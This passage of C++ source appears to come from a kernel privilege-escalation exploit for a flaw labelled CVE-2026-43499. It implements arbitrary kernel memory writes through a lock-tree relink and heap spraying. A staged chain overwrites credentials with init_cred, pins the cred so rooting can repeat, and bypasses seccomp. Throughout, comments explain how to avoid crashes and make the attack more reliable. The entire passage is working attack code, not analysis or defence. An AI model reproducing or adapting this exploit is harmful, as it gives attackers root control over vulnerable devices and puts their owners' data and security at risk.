     * Shared statement order; the middleware policy decides the resident step. */
    template <class M>
    Status Cve2026_43499Policy::attack_write(ExploitSession &session,
                                             const memory::WriteRequest &request,
                                             const char *desc) {
        pr_info("=== %s === target=0x%016zx mode=%d leaf=%d\n", desc,
                request.target, static_cast<int32_t>(request.mode),
                !request.preserve_child);
        if (!attack::in_direct_map(request.target)) {
            pr_warning("  target is outside the direct map, not writing\n");
            return 0;
        }

        /* Both transports write := value through the erase left-only relink:
         * waiter words are {pc = value, right = 0, left = destination}, where the
         * destination is the target for the pointer layouts and target-1 for the
         * zero layout (kZeroWritePc in memory/payload_builder.h).
         *
         * Beware the trap that this comment used to state as fact: "the node is
         * RED so no color fixup runs" is false. The erase's own arm runs no color
         * fixup, but it does plant `left` in the lock's tree root whenever pc has
         * no parent pointer, and the walk then enqueues -- rb_insert_color() reads
         * *(left) & 1 and dereferences a NULL grandparent when that word is even.
         * A zero write must therefore carry an odd pc. */
        if (support::page_free_run()) {
            /* Page-free Stage 3: no spray, no leak, no page-acceptance gate.
             * The write layout is still derived from this request -- W1/W1p
             * carry the profile's scratch value, W2 carries init_cred, leaf
             * writes carry target - 8 -- so the route stamps unchanged. */
            attack::timer_mark("  page-free write start");
            if (!support::prepare_page_free_context(request)) {
                pr_warning("  page-free write context failed\n");
                return 0;
            }
            attack::timer_mark("  page-free write ready");
        } else {
            attack::timer_mark("  heap spray start");
            (session.heap.current.base) = support::prepare_good_kernel_page(request);
            if (!(session.heap.current.base)) {
                pr_warning("  heap spray failed\n");
                return 0;
            }
            attack::timer_mark("  heap spray done");
        }
        Status routed = route::middleware::run_middleware_route(session, request);

        attack::timer_mark("  PI route done");
        if (!routed) {
            pr_warning("  PI route did not produce a verified write\n");
        }

        return routed;
    }

    template <class M>
    StageResult Cve2026_43499Policy::run(ExploitSession &session,
                                         const profile::kernel_offsets &decoded,
                                         const char *debug_dir, bool force_attack,
                                         VictimChain &chain) {
        switch (run_setup(session, decoded, debug_dir, force_attack)) {
            case StageResult::Failed:
                return StageResult::Failed;
            case StageResult::Done:
                return StageResult::Done;
            case StageResult::Continue:
                break;
        }
        switch (w1<M>(session)) {
            case StageResult::Failed:
                return StageResult::Failed;
            case StageResult::Done:
                return StageResult::Done;
            case StageResult::Continue:
                break;
        }

        /* Before the first root of this run: make the cred it points at
         * immortal. See cred_pin(). Best-effort on purpose -- a missed write is
         * the ordinary case every other stage retries, and aborting the run
         * because the *hardening* did not land would turn a degraded boot into a
         * certain failure. Measured on stock: failing the run here cost the
         * first run of a clean boot outright. */
        if (!cred_pin<M>(session)) {
            pr_warning("cred pin: not applied this run; the boot will stop rooting after "
                       "~4 successful roots (reboot to clear)\n");
        }

        /* W2+W3 as a retryable chain: a missed W3 write or probe can kill the
         * child, so respawn and redo. */
        attack::slab_drain();
        attack::timer_mark("pre-W2 drain");
        victim::w2_stage_context w2_context = {.pipes = session.victim};
        const uint32_t chain_rounds = g_exploit_session.profile.w3_chain_rounds();
        for (uint32_t round = 1; round <= chain_rounds; round++) {
            if (round > 1) park_retry_child(session, chain, round, chain_rounds);

            uintptr_t child_task = 0;
            const VictimRound rooted = w2<M>(session, chain, w2_context, child_task);
            if (rooted == VictimRound::Failed) return StageResult::Failed;
            if (rooted == VictimRound::Retry) continue;
            if (w3<M>(session, chain, w2_context, child_task)) break;
        }
        if (!chain.seccomp_ok) {
            pr_warning("W3 seccomp bypass failed after %u chain rounds; ksud late-load will likely stay blocked\n",
                       chain_rounds);
        }
        /* The frontend handoff step finishes the run. */
        return StageResult::Continue;
    }

    /* Explicit instantiations: the catalogued middleware policies. Callers only
     * include the header; the definitions stay in this unit. */
    template StageResult Cve2026_43499Policy::run<route::SelectPolicy>(
        ExploitSession &, const profile::kernel_offsets &, const char *, bool, VictimChain &);
    template StageResult Cve2026_43499Policy::run<route::TcpPolicy>(
        ExploitSession &, const profile::kernel_offsets &, const char *, bool, VictimChain &);
    template StageResult Cve2026_43499Policy::run<route::MulticastPolicy>(
        ExploitSession &, const profile::kernel_offsets &, const char *, bool, VictimChain &);
    template StageResult Cve2026_43499Policy::run<route::SigreturnPolicy>(
        ExploitSession &, const profile::kernel_offsets &, const char *, bool, VictimChain &);

    template Status Cve2026_43499Policy::attack_write<route::SelectPolicy>(
        ExploitSession &, const memory::WriteRequest &, const char *);
    template Status Cve2026_43499Policy::attack_write<route::TcpPolicy>(
        ExploitSession &, const memory::WriteRequest &, const char *);
    template Status Cve2026_43499Policy::attack_write<route::MulticastPolicy>(
        ExploitSession &, const memory::WriteRequest &, const char *);
    template Status Cve2026_43499Policy::attack_write<route::SigreturnPolicy>(
        ExploitSession &, const memory::WriteRequest &, const char *);
} // namespace ghostlock::session::backend
